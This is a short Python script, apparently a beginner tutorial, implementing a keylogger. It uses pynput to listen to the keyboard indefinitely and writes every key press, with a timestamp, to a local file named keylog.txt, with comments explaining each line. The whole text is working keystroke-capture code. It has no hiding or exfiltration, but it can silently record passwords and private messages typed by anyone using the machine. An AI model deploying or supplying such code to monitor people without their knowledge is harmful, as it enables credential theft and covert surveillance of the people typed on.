from pynput import keyboard # Import the keyboard module to monitor keyboard events
import logging # Import the logging module (record key presses and releases)

# Logging configuration 
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
    # Logs will be saved to keylog.txt, includes timestamp and key pressed. Level is set to INFO to record all events.

def on_press(key):
    logging.info(f'Key pressed: {key}')
    # Function called whenever a key is pressed. Logs the key pressed to the keylog.txt file


# Set up the listener 
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    # Keyboard listener monitors key presses and releases indefinitely


